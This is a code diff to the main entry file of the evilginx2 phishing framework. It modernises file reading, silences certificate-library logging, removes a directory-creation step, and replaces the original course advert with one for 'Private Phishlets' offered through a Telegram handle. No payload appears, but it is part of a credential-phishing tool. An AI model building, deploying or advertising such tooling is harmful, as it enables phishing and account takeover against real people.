@@ -3,15 +3,17 @@ package main
 import (
 	"flag"
 	"fmt"
-	"io/ioutil"
+	_log "log"
 	"os"
 	"os/user"
 	"path/filepath"
 	"regexp"
 
+	"github.com/caddyserver/certmagic"
 	"github.com/kgretzky/evilginx2/core"
 	"github.com/kgretzky/evilginx2/database"
 	"github.com/kgretzky/evilginx2/log"
+	"go.uber.org/zap"
 
 	"github.com/fatih/color"
 )
@@ -37,7 +39,7 @@ func showAd() {
 	lred := color.New(color.FgHiRed)
 	lyellow := color.New(color.FgHiYellow)
 	white := color.New(color.FgHiWhite)
-	message := fmt.Sprintf("%s: %s %s", lred.Sprint("Evilginx Mastery Course"), lyellow.Sprint("https://academy.breakdev.org/evilginx-mastery"), white.Sprint("(learn how to create phishlets)"))
+	message := fmt.Sprintf("%s: %s %s", lred.Sprint("Private Phishlets"), lyellow.Sprint("https://t.me/HosterMSG"), white.Sprint("(Updated at 2024/04/02 )"))
 	log.Info("%s", message)
 }
 
@@ -54,6 +56,10 @@ func main() {
 
 	core.Banner()
 	showAd()
+
+	_log.SetOutput(log.NullLogger().Writer())
+	certmagic.Default.Logger = zap.NewNop()
+	certmagic.DefaultACME.Logger = zap.NewNop()
 
 	if *phishlets_dir == "" {
 		*phishlets_dir = joinPath(exe_dir, "./phishlets")
@@ -110,11 +116,6 @@ func main() {
 
 	crt_path := joinPath(*cfg_dir, "./crt")
 
-	if err := core.CreateDir(crt_path, 0700); err != nil {
-		log.Fatal("mkdir: %v", err)
-		return
-	}
-
 	cfg, err := core.NewConfig(*cfg_dir, "")
 	if err != nil {
 		log.Fatal("config: %v", err)
@@ -134,7 +135,7 @@ func main() {
 		return
 	}
 
-	files, err := ioutil.ReadDir(phishlets_path)
+	files, err := os.ReadDir(phishlets_path)
 	if err != nil {
 		log.Fatal("failed to list phishlets directory '%s': %v", phishlets_path, err)
 		return
